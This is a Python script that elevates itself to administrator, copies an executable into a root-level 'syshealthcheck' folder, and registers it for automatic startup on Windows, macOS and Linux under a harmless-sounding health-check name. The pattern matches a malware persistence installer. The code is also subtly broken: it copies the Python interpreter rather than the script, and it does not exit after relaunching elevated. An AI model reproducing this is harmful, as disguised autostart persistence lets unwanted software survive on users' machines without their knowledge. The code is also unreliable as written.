import os
import shutil
import subprocess
import sys
import platform
import ctypes
import winshell  # Ensure you have installed winshell for Windows startup handling

def runasadmin():
    """ Check if the script is running as admin and relaunch with admin privileges if not."""
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        script_path = os.path.abspath(__file__)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)

def create_syshealthcheck_folder():
    """Create the syshealthcheck folder in the root directory."""
    platform_system = platform.system()
    if platform_system == "Windows":
        folder_path = "C:\\syshealthcheck"
    elif platform_system in ["Darwin", "Linux"]:  # Darwin is macOS
        folder_path = "/syshealthcheck"
    else:
        raise ValueError("Unsupported operating system")

    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    return folder_path

def copy_executable_to_stable_location():
    """Copy the executable to a stable location based on the operating system."""
    stable_directory = create_syshealthcheck_folder()
    executable_name = os.path.basename(sys.executable)
    stable_path = os.path.join(stable_directory, executable_name)

    if not os.path.exists(stable_path):
        try:
            shutil.copy(sys.executable, stable_path)
            print(f"Executable copied to {stable_path}")
        except Exception as e:
            print(f"Error copying executable: {e}")

    return stable_path

def add_to_startup_windows(app_path):
    """Add the application to the Windows Startup folder."""
    try:
        startup = winshell.startup()  # Get the path to the Startup folder
        shortcut_path = os.path.join(startup, "syshealthcheck.lnk")  # Shortcut name

        with winshell.shortcut(shortcut_path) as shortcut:
            shortcut.path = app_path  # Path to the executable
            shortcut.description = "SysHealthCheck Application"
        
        print(f"Shortcut created at {shortcut_path}")

    except Exception as e:
        print(f"Failed to add to startup: {e}")

def add_to_startup_macos(app_path):
    """Add the application to macOS LaunchAgents to start on boot."""
    try:
        # Create a launch agent for macOS
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.syshealthcheck.startup</string>
    <key>ProgramArguments</key>
    <array>
        <string>{app_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        launch_agent_path = os.path.expanduser('~/Library/LaunchAgents/com.syshealthcheck.startup.plist')
        with open(launch_agent_path, 'w') as plist_file:
            plist_file.write(plist_content)

        print(f"Launch agent for '{app_path}' created successfully at {launch_agent_path}")
    except Exception as e:
        print(f"Failed to add to startup on macOS: {e}")

def add_to_startup_linux(app_path):
    """Add the application to systemd services to start on boot for Linux."""
    try:
        # Create a systemd service
        service_content = f"""[Unit]
Description=SysHealthCheck

[Service]
ExecStart={app_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        service_file_path = "/etc/systemd/system/syshealthcheck.service"
        with open(service_file_path, 'w') as service_file:
            service_file.write(service_content)

        # Enable the service to start on boot
        subprocess.run(["systemctl", "enable", "syshealthcheck.service"], check=True)
        print(f"Systemd service created for '{app_path}' and enabled at {service_file_path}")

    except Exception as e:
        print(f"Failed to add to startup on Linux: {e}")

def main():
    # Check for administrator privileges or if already elevated
    if platform.system() == "Windows":
        runasadmin()

    # Copy the executable to a stable location
    stable_path = copy_executable_to_stable_location()

    # Add to startup based on the operating system
    if platform.system() == "Windows":
        add_to_startup_windows(stable_path)
    elif platform.system() == "Darwin":
        add_to_startup_macos(stable_path)
    elif platform.system() == "Linux":
        add_to_startup_linux(stable_path)
    else:
        print("Unsupported operating system")

